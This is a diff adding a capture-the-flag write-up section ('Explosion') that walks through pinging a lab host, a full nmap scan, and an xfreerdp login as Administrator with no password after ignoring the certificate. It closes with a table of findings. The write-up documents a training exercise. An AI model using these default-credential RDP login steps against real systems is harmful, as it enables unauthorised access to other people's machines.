@@ -998,3 +998,203 @@ Using nmap, we were able to discover the host was running an Redis on port 6379.
 
 [Table of Contents](#table-of-contents) 
 
+
+## Level 5: Explosion
+
+### Scope
+
+The first step is listing the available information given in this scenario. We can define this setup as a grey-box, since we have been given partial information about the server. The following information is what we know about the scenario:
+
+| # | 	Description 	| Value |
+| ----------- | ----------- | ----------- |
+| 1 | 	IP Address   |    	10.129.2.176 | 
+
+### Enumeration
+
+Given the overall scope of the scenario, we can now begin the enumeration process. We have been given an IP address of the machine, so we can start initiating a port scan using nmap.
+
+First we can try to see if we can make contact with the machine with a ping request.
+
+```
+ping {ip address}
+```
+The results from the ping are:
+
+```
+└─$ ping 10.129.2.176 
+
+PING 10.129.2.176 (10.129.2.176) 56(84) bytes of data.
+64 bytes from 10.129.2.176: icmp_seq=1 ttl=127 time=10.8 ms
+64 bytes from 10.129.2.176: icmp_seq=2 ttl=127 time=8.38 ms
+64 bytes from 10.129.2.176: icmp_seq=3 ttl=127 time=6.35 ms
+64 bytes from 10.129.2.176: icmp_seq=4 ttl=127 time=12.7 ms
+
+--- 10.129.2.176 ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 3006ms
+rtt min/avg/max/mdev = 6.353/9.562/12.696/2.402 ms
+
+```
+As we can see, we made a connection with the host. 
+
+Next, we can try using nmap to see if there are any ports that can be exploited.
+
+```
+nmap -p- --min-rate 3000 -sC -sV {ip address}
+```
+
+Where:
+
+```
+-p-: scans ALL ports
+--min-rate <number>: Send packets no slower than <number> per second
+-sC: equivalent to --script=default
+-sV: Probe open ports to determine service/version info
+```
+The results of nmap are:
+
+```
+└─$ nmap -p- --min-rate 3000 -sC -sV 10.129.2.176 
+
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-22 12:11 EDT
+Nmap scan report for 10.129.2.176
+Host is up (0.0087s latency).
+Not shown: 65521 closed tcp ports (conn-refused)
+PORT      STATE SERVICE       VERSION
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: EXPLOSION
+|   NetBIOS_Domain_Name: EXPLOSION
+|   NetBIOS_Computer_Name: EXPLOSION                                                              
+|   DNS_Domain_Name: Explosion                                                                    
+|   DNS_Computer_Name: Explosion                                                                  
+|   Product_Version: 10.0.17763                                                                   
+|_  System_Time: 2022-07-22T16:12:35+00:00                                                        
+| ssl-cert: Subject: commonName=Explosion                                                         
+| Not valid before: 2022-07-21T16:09:57                                                           
+|_Not valid after:  2023-01-20T16:09:57                                                           
+|_ssl-date: 2022-07-22T16:12:43+00:00; 0s from scanner time.                                      
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                             
+|_http-server-header: Microsoft-HTTPAPI/2.0                                                       
+|_http-title: Not Found                                                                           
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+49670/tcp open  msrpc         Microsoft Windows RPC
+49671/tcp open  msrpc         Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2022-07-22T16:12:40
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 72.88 seconds
+
+```
+Our scan shows many ports to explore. Looking at the selection of ports, port 3389 being open seems to be the most interesting. This port is reserved for remote desktop logins on Windows machines. Since RDP is a native windows protocol, we need to find a tool to connect since I am currently using the Kali Linux environment.
+
+A free open-source tool that we can use in Linux is [FreeRDP](https://www.freerdp.com/)
+
+> FreeRDP is a free implementation of the Remote Desktop Protocol (RDP), released under the Apache license. Enjoy the freedom of using your software wherever you want, the way you want it, in a world where interoperability can finally liberate your computing experience.
+
+We can first try to establish a connection:
+
+```
+└─$ xfreerdp /v:10.129.2.176
+
+[12:25:46:785] [6781:6782] [INFO][com.freerdp.client.x11] - No user name set. - Using login name: kali
+[12:25:46:143] [6781:6782] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
+[12:25:46:143] [6781:6782] [WARN][com.freerdp.crypto] - CN = Explosion
+[12:25:46:143] [6781:6782] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+[12:25:46:143] [6781:6782] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
+[12:25:46:143] [6781:6782] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+[12:25:46:143] [6781:6782] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.2.176:3389) 
+[12:25:46:143] [6781:6782] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
+[12:25:46:143] [6781:6782] [ERROR][com.freerdp.crypto] - Common Name (CN):
+[12:25:46:143] [6781:6782] [ERROR][com.freerdp.crypto] -        Explosion
+[12:25:46:143] [6781:6782] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
+Certificate details for 10.129.2.176:3389 (RDP-Server):
+        Common Name: Explosion
+        Subject:     CN = Explosion
+        Issuer:      CN = Explosion
+        Thumbprint:  d3:a9:f6:c4:11:a1:b1:19:0a:71:bb:2a:72:8c:73:9b:7f:bb:59:74:c1:98:6f:2d:3d:2a:ea:90:0b:ef:27:fe
+The above X.509 certificate could not be verified, possibly because you do not have
+the CA certificate in your certificate store, or the certificate has expired.
+Please look at the OpenSSL documentation on how to add a private CA to the store.
+Do you trust the above certificate? (Y/T/N) 
+
+
+```
+Looking at the ouput, we can see that that our default account was not validated. 
+
+Next, we can try forcing the certifcate to by ignored:
+
+```
+└─$ xfreerdp /v:10.129.2.176 /cert:ignore  
+
+[12:28:21:567] [7463:7464] [INFO][com.freerdp.client.x11] - No user name set. - Using login name: kali
+Domain:   
+Password: 
+[12:28:26:211] [7463:7464] [ERROR][com.freerdp.core] - transport_ssl_cb:freerdp_set_last_error_ex ERRCONNECT_PASSWORD_CERTAINLY_EXPIRED [0x0002000F]
+[12:28:26:211] [7463:7464] [ERROR][com.freerdp.core.transport] - BIO_read returned an error: error:0A000438:SSL routines::tlsv1 alert internal error
+
+
+```
+Now we can attempt at cycling through different user names.
+
+According to [google](https://www.google.com/search?client=firefox-b-1-e&q=default+rdp+user+name), the default user name for RDP is Administrator.
+
+We can try to login using that credential:
+
+```
+─$ xfreerdp /v:10.129.2.176 /cert:ignore /u:Administrator
+Password: 
+
+[12:34:01:416] [9014:9015] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Eastern
+[12:34:02:718] [9014:9015] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
+[12:34:02:718] [9014:9015] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
+[12:34:02:748] [9014:9015] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
+[12:34:02:749] [9014:9015] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
+[12:34:03:746] [9014:9015] [INFO][com.freerdp.client.x11] - Logon Error Info LOGON_FAILED_OTHER [LOGON_MSG_SESSION_CONTINUE]
+
+```
+
+![Screenshot_2022-07-22_12_34_40](https://user-images.githubusercontent.com/59018247/180485827-eda2759f-4a48-46ce-b9c9-509b0cafb902.png)
+
+Looks like it was a success! We have full access to this Windows Server 2019.
+
+Browsing the desktop we can see our fifth flag to collect.
+
+![Screenshot_2022-07-22_12_46_03](https://user-images.githubusercontent.com/59018247/180486360-7937f464-ab10-4fce-85c4-3a05aa2fcf85.png)
+
+
+## Conclusions - Level 5 Explosion
+
+| # | 	Tools 	| Description |
+| ----------- | ----------- | ----------- |
+| 1 | 	nmap   |    	Used for scanning ports on hosts. | 
+| 2 | 	FreeRDP   |    	Used to connect to Windows RDP machines | 
+
+| # | 	Vulnerabilities 	| Critical | High | Medium | Low |
+| ----------- | ----------- | ----------- | ----------- | ----------- | ----------- |
+| 1 | 	Default/Weak Credentials   |    	X |  |  |  |
+| 2 | 	RDP Port 3389 exposed externally   |    	 | X |  |  |
+
+Using nmap, we were able to discover the host had RDP port 3389 open externally. Using FreeRDP, we were then able to get access remote access to the machine, a consequence of the server administrator having poorly configured the default login credentials.
+
+
+[Table of Contents](#table-of-contents) 
+
